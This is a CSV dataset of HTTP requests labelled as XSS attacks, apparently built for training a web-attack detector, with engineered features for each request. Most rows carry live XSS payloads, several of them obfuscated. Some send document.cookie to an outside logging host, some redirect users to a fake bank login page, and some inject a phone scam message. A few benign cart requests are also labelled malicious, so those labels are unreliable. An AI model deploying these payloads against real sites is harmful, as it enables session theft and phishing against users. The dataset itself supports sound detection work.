RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek
PUT,/profile,,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:2525,"{""name"": ""%26%23%78%35%38%3b%26%23%78%35%33%3b%26%23%78%35%33%3b%26%23%78%32%30%3b%26%23%78%35%35%3b%26%23%78%37%33%3b%26%23%78%36%35%3b%26%23%78%37%32%3b%26%23%78%32%30%3b%26%23%78%33%63%3b%26%23%78%36%39%3b%26%23%78%36%65%3b%26%23%78%37%30%3b%26%23%78%37%35%3b%26%23%78%37%34%3b%26%23%78%32%30%3b%26%23%78%37%34%3b%26%23%78%37%39%3b%26%23%78%37%30%3b%26%23%78%36%35%3b%26%23%78%33%64%3b%26%23%78%36%38%3b%26%23%78%36%39%3b%26%23%78%36%34%3b%26%23%78%36%34%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%32%30%3b%26%23%78%36%66%3b%26%23%78%36%65%3b%26%23%78%36%36%3b%26%23%78%36%66%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%37%33%3b%26%23%78%33%64%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%37%34%3b%26%23%78%32%65%3b%26%23%78%36%32%3b%26%23%78%36%66%3b%26%23%78%36%34%3b%26%23%78%37%39%3b%26%23%78%32%65%3b%26%23%78%36%39%3b%26%23%78%36%65%3b%26%23%78%36%65%3b%26%23%78%36%35%3b%26%23%78%37%32%3b%26%23%78%34%38%3b%26%23%78%35%34%3b%26%23%78%34%64%3b%26%23%78%34%63%3b%26%23%78%32%30%3b%26%23%78%33%64%3b%26%23%78%32%30%3b%26%23%78%32%37%3b%26%23%78%33%63%3b%26%23%78%36%38%3b%26%23%78%33%31%3b%26%23%78%33%65%3b%26%23%78%35%34%3b%26%23%78%37%32%3b%26%23%78%37%35%3b%26%23%78%37%33%3b%26%23%78%37%34%3b%26%23%78%32%30%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%32%31%3b%26%23%78%33%63%3b%26%23%78%32%66%3b%26%23%78%36%38%3b%26%23%78%33%31%3b%26%23%78%33%65%3b%26%23%78%33%63%3b%26%23%78%37%30%3b%26%23%78%33%65%3b%26%23%78%34%33%3b%26%23%78%36%31%3b%26%23%78%36%63%3b%26%23%78%36%63%3b%26%23%78%32%30%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%32%30%3b%26%23%78%36%31%3b%26%23%78%37%34%3b%26%23%78%32%30%3b%26%23%78%33%31%3b%26%23%78%32%30%3b%26%23%78%33%38%3b%26%23%78%33%38%3b%26%23%78%33%38%3b%26%23%78%32%30%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%33%35%3b%26%23%78%32%30%3b%26%23%78%33%38%3b%26%23%78%33%34%3b%26%23%78%33%34%3b%26%23%78%33%33%3b%26%23%78%32%65%3b%26%23%78%33%63%3b%26%23%78%32%66%3b%26%23%78%37%30%3b%26%23%78%33%65%3b%26%23%78%32%37%3b%26%23%78%33%62%3b%26%23%78%32%30%3b%26%23%78%36%31%3b%26%23%78%37%35%3b%26%23%78%37%34%3b%26%23%78%36%66%3b%26%23%78%36%36%3b%26%23%78%36%66%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%37%33%3b%26%23%78%33%65%3b"", ""bio"": ""%2526%2523x53%253B%2526%2523x6f%253B%2526%2523x6d%253B%2526%2523x65%253B%2526%2523x20%253B%2526%2523x58%253B%2526%2523x53%253B%2526%2523x53%253B%2526%2523x20%253B%2526%2523x42%253B%2526%2523x69%253B%2526%2523x6f%253B""}",,malicious,xss,2762,8,0,2525,2,2286,812,798,36,0.3206,0,32,True,False,False,False,1,False,True,False,False,6,20,Tuesday
GET,/rest/products/search,path=%3Ca+href%3D%22javascript%3Anew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B%22%3EDownload%3C%2Fa%3E,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,373,21,164,0,1,115,36,22,0,0.1946,2,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/14,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 5}",,malicious,xss,284,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/search,search=data%3Atext%2Fhtml%2C%253Cscript%253Ewindow.location.href%2B%253D%2B%2522https%253A%252F%252Fpankofamerika.com%252Ffake_login%2522%253B%253C%252Fscript%253E,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,407,21,163,0,1,120,25,18,13,0.1359,3,34,False,False,False,False,3,True,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:260,"{""name"": ""XSS+User+data%3Atext%2Fhtml%2C%253Cscript%253Edocument.body.innerHTML%2B%253D%2B%2527%253Ch1%253ETrust%2Bme%2521%253C%252Fh1%253E%253Cp%253ECall%2Bme%2Bat%2B1%2B888%2B345%2B8443.%253C%252Fp%253E%2527%253B%253C%252Fscript%253E"", ""bio"": ""Some+XSS+Bio""}",,malicious,xss,560,8,0,260,2,225,53,32,20,0.1978,4,49,True,False,False,False,1,True,True,False,False,6,20,Tuesday
GET,/rest/products/search,data=%3Cinput+type%3Dhidden+onkeyup%3Ddocument.body.innerHTML+%3D+%27%3Ch1%3ETrust+me%21%3C%2Fh1%3E%3Cp%3ECall+me+at+1+888+345+8443.%3C%2Fp%3E%27%3B+autofocus%3E,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,415,21,161,0,1,118,37,19,0,0.2033,1,40,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=%3Cscript%3Edocument.body.innerHTML+%3D+%27%3Ch1%3ETrust+me%21%3C%2Fh1%3E%3Cp%3ECall+me+at+1+888+345+8443.%3C%2Fp%3E%27%3B%3C%2Fscript%3E,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,394,21,140,0,1,97,35,20,0,0.2174,2,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=data%25253Atext%25252Fhtml%25252C%2525253Cscript%2525253Ewindow.location.href%25252B%2525253D%25252B%25252522https%2525253A%2525252F%2525252Fpankofamerika.com%2525252Ffake_login%25252522%2525253B%2525253C%2525252Fscript%2525253E,HTTP/1.1,"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,507,21,235,0,1,192,25,18,18,0.0977,3,34,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%3Cinput+type%3Dsearch+onblur%3Ddocument.body.innerHTML+%3D+%27%3Ch1%3ETrust+me%21%3C%2Fh1%3E%3Cp%3ECall+me+at+1+888+345+8443.%3C%2Fp%3E%27%3B+autofocus%3E,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,397,21,160,0,1,117,37,19,0,0.2044,1,39,False,False,False,False,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/8,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,xss,267,17,0,0,0,0,4,0,0,0.2353,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/search,category=%3Cimg+src%3Dx+onkeyup%3Dnew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B%3E,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,387,21,144,0,1,101,32,17,0,0.1939,1,39,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=%25253CBODy%252BonBlUr%25253dneW%252bImaGE%252528%252529.SrC%252B%25253d%252B%252522HtTPS%25253a%25252F%25252FwENoJhdSkdsF.cOM%25252fLOg_coOkie.php%25253fc%25253d%252522%252b%25252b%252bdOcuMEnt.coOKie%25253b%25253e,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,468,21,218,0,1,171,30,22,22,0.1255,1,50,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:703,"{""name"": ""%2558%2553%2553%2520%2555%2573%2565%2572%2520%253c%2561%2520%2568%2572%2565%2566%253d%2522%256a%2561%2576%2561%2573%2563%2572%2569%2570%2574%253a%256e%2565%2577%2520%2549%256d%2561%2567%2565%2528%2529%252e%2573%2572%2563%2520%253d%2520%2522%2568%2574%2574%2570%2573%253a%252f%252f%2577%2565%256e%256f%256a%2568%2564%2573%256b%2564%2573%2566%252e%2563%256f%256d%252f%256c%256f%2567%255f%2563%256f%256f%256b%2569%2565%252e%2570%2568%2570%253f%2563%253d%2522%2520%252b%2520%2564%256f%2563%2575%256d%2565%256e%2574%252e%2563%256f%256f%256b%2569%2565%253b%2522%253e%2543%256c%2569%2563%256b%2520%256d%2565%253c%252f%2561%253e"", ""bio"": ""%2553%256f%256d%2565%2520%2558%2553%2553%2520%2542%2569%256f""}",,malicious,xss,969,8,0,703,2,620,150,136,136,0.211,0,31,True,False,False,False,1,False,True,False,False,6,20,Tuesday
GET,/rest/products/search,file=%3Cscript%3Edocument.body.innerHTML+%3D+%27%3Ch1%3ETrust+me%21%3C%2Fh1%3E%3Cp%3ECall+me+at+1+888+345+8443.%3C%2Fp%3E%27%3B%3C%2Fscript%3E,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,379,21,142,0,1,97,35,20,0,0.2147,2,39,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,category=%253Cimg%2Bsrc%253Dx%2Bonerror%253Dalert%2526%252340%253B1%2526%252341%253B%253E,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,357,21,89,0,1,56,15,12,10,0.1364,1,32,False,False,False,False,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/10,,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,xss,214,18,0,0,0,0,4,0,0,0.2222,0,11,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/search,id=%3CA+HrEf%3D%22jAVAScRIPt%3Anew+IMagE%28%29.sRc+%3D+%22htTps%3A%2F%2FwenOJHdsKdsF.coM%2FLog_CoOKie.phP%3FC%3D%22+%2B+docuMEnT.cooKIe%3B%22%3ElOgIn%3C%2Fa%3E,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,420,21,159,0,1,112,36,22,0,0.2,2,46,False,False,False,False,3,True,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:202,"{""name"": ""XSS+User+%3Cscript%3Enew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B%3C%2Fscript%3E"", ""bio"": ""%53%6f%6d%65%20%58%53%53%20%42%69%6f""}",,malicious,xss,478,8,0,202,2,143,56,30,0,0.2667,4,50,True,False,False,False,1,False,True,False,False,6,20,Tuesday
GET,/rest/products/search,data=%2526%2523%2578%2533%2563%253b%2526%2523%2578%2536%2532%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2534%253b%2526%2523%2578%2537%2539%253b%2526%2523%2578%2532%2530%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2564%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2537%2535%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2537%2536%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2533%2564%253b%2526%2523%2578%2537%2537%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2534%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2537%2537%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2536%2538%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2536%2536%253b%2526%2523%2578%2532%2530%253b%2526%2523%2578%2533%2564%253b%2526%2523%2578%2532%2530%253b%2526%2523%2578%2532%2532%253b%2526%2523%2578%2536%2538%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2537%2530%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2533%2561%253b%2526%2523%2578%2532%2566%253b%2526%2523%2578%2532%2566%253b%2526%2523%2578%2537%2530%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2562%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2536%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2536%2564%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2536%2562%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2564%253b%2526%2523%2578%2532%2566%253b%2526%2523%2578%2536%2536%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2536%2562%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2535%2566%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2537%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2532%2532%253b%2526%2523%2578%2533%2562%253b%2526%2523%2578%2533%2565%253b,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,2679,21,2435,0,1,1458,489,486,486,0.1991,0,25,False,False,False,False,3,True,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/7,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 5}",,malicious,xss,306,17,0,15,1,0,9,0,0,0.2812,0,20,True,False,False,True,4,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,q=data%253Atext%252Fhtml%252C%25253Cscript%25253Enew%252BImage%252528%252529.src%252B%25253D%252B%252522https%25253A%25252F%25252Fwenojhdskdsf.com%25252Flog_cookie.php%25253Fc%25253D%252522%252B%25252B%252Bdocument.cookie%25253B%25253C%25252Fscript%25253E,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,505,21,255,0,1,201,34,26,26,0.1232,3,39,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=%3Ca+href%3D%22javascript%3Awindow.location.href+%3D+%22https%3A%2F%2Fpankofamerika.com%2Ffake_login%22%3B%22%3EClick+me%3C%2Fa%3E,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,354,21,133,0,1,96,28,17,0,0.1818,2,35,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=data%3Atext%2Fhtml%2C%253Cscript%253Edocument.body.innerHTML%2B%253D%2B%2527%253Ch1%253ETrust%2Bme%2521%253C%252Fh1%253E%253Cp%253ECall%2Bme%2Bat%2B1%2B888%2B345%2B8443.%253C%252Fp%253E%2527%253B%253C%252Fscript%253E,HTTP/1.1,"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,493,21,221,0,1,152,38,32,20,0.157,2,39,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:196,"{""name"": ""XSS User data:text/html,%3Cscript%3Edocument.body.innerHTML+%3D+%27%3Ch1%3ETrust+me%21%3C%2Fh1%3E%3Cp%3ECall+me+at+1+888+345+8443.%3C%2Fp%3E%27%3B%3C%2Fscript%3E"", ""bio"": ""Some XSS Bio""}",,malicious,xss,492,8,0,196,2,161,49,20,0,0.2402,4,48,True,False,False,False,1,True,True,False,False,6,20,Tuesday
GET,/rest/products/search,query=%3Cinput+type%3Dtext+onmouseover%3Dnew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B+autofocus%3E,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,357,21,161,0,1,121,33,17,0,0.1813,2,41,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,query=%3CscriPT%3EnEw+IMage%28%29.SRC+%3D+%22hTTPS%3A%2F%2FWENOJHdSKdSF.coM%2Flog_cookIE.php%3FC%3D%22+%2B+DOCumenT.cookie%3B%3C%2FScripT%3E,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,377,21,140,0,1,98,31,18,0,0.1925,3,48,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%25253Cbody%252Bonclick%25253Dwindow.location.href%252B%25253D%252B%252522https%25253A%25252F%25252Fpankofamerika.com%25252Ffake_login%252522%25253B%25253E,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,363,21,157,0,1,127,21,14,14,0.118,2,36,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%3Csvg%2Fonerror%3Ddocument.body.innerHTML+%3D+%27%3Ch1%3ETrust+me%21%3C%2Fh1%3E%3Cp%3ECall+me+at+1+888+345+8443.%3C%2Fp%3E%27%3B%3E,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,364,21,137,0,1,94,34,19,0,0.2152,0,41,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/6,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Brave/125.1.63.162",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 3}",,malicious,xss,318,17,0,15,1,0,9,0,0,0.2812,0,20,True,False,False,True,4,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,term=%3Ca+href%3D%22javascript%3Awindow.location.href+%3D+%22https%3A%2F%2Fpankofamerika.com%2Ffake_login%22%3B%22%3EClick+me%3C%2Fa%3E,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,389,21,135,0,1,96,28,17,0,0.1795,2,35,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%26%23x3c%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3e%3B%26%23x64%3B%26%23x6f%3B%26%23x63%3B%26%23x75%3B%26%23x6d%3B%26%23x65%3B%26%23x6e%3B%26%23x74%3B%26%23x2e%3B%26%23x62%3B%26%23x6f%3B%26%23x64%3B%26%23x79%3B%26%23x2e%3B%26%23x69%3B%26%23x6e%3B%26%23x6e%3B%26%23x65%3B%26%23x72%3B%26%23x48%3B%26%23x54%3B%26%23x4d%3B%26%23x4c%3B%26%23x20%3B%26%23x3d%3B%26%23x20%3B%26%23x27%3B%26%23x3c%3B%26%23x68%3B%26%23x31%3B%26%23x3e%3B%26%23x54%3B%26%23x72%3B%26%23x75%3B%26%23x73%3B%26%23x74%3B%26%23x20%3B%26%23x6d%3B%26%23x65%3B%26%23x21%3B%26%23x3c%3B%26%23x2f%3B%26%23x68%3B%26%23x31%3B%26%23x3e%3B%26%23x3c%3B%26%23x70%3B%26%23x3e%3B%26%23x43%3B%26%23x61%3B%26%23x6c%3B%26%23x6c%3B%26%23x20%3B%26%23x6d%3B%26%23x65%3B%26%23x20%3B%26%23x61%3B%26%23x74%3B%26%23x20%3B%26%23x31%3B%26%23x20%3B%26%23x38%3B%26%23x38%3B%26%23x38%3B%26%23x20%3B%26%23x33%3B%26%23x34%3B%26%23x35%3B%26%23x20%3B%26%23x38%3B%26%23x34%3B%26%23x34%3B%26%23x33%3B%26%23x2e%3B%26%23x3c%3B%26%23x2f%3B%26%23x70%3B%26%23x3e%3B%26%23x27%3B%26%23x3b%3B%26%23x3c%3B%26%23x2f%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3e%3B,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1426,21,1169,0,1,582,294,291,0,0.2471,0,28,False,False,False,False,3,False,True,False,False,4,20,Tuesday
